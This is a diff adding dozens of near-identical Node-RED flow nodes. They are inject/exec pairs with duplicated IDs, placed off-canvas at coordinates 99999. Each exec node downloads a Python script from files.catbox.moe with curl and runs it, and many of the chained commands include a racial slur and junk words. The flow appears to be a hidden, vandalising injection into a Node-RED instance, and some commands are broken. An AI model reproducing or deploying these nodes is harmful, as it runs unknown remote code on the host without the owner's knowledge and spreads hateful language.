+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/i0pkst.py && python3 i0pkst.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  && python3  && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/wr06pj.py && python3 wr06pj.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/lbu18p.py && python3 lbu18p.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/98vfkg.py && python3 98vfkg.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/tu12n6.py && python3 tu12n6.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/6ukc69.py && python3 6ukc69.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/ohvtzr.py && python3 ohvtzr.py && a && b && c && d && e && f && g",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O  && python3  && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
+                "p": "payload"
+            },
+            {
+                "p": "topic",
+                "vt": "str"
+            }
+        ],
+        "repeat": "",
+        "crontab": "",
+        "once": false,
+        "onceDelay": 0.1,
+        "topic": "",
+        "payload": "",
+        "payloadType": "date",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [
+                "04e9bf59d127ed59"
+            ]
+        ]
+    },
+    {
+        "id": "04e9bf59d127ed59",
+        "type": "exec",
+        "z": "7c816d41.c6de64",
+        "command": "curl -O https://files.catbox.moe/uuyf7h.py && python3 uuyf7h.py && a && b && c && d && e && f && g && ssg & niggers && 08hvh && razorblades && applehack",
+        "addpay": "payload",
+        "append": "",
+        "useSpawn": "false",
+        "timer": "10080",
+        "winHide": false,
+        "oldrc": false,
+        "name": "",
+        "x": 99999,
+        "y": 99999,
+        "wires": [
+            [],
+            [],
+            []
+        ]
+    },
+    {
+        "id": "213d0c20572925ff",
+        "type": "inject",
+        "z": "7c816d41.c6de64",
+        "name": "",
+        "props": [
+            {
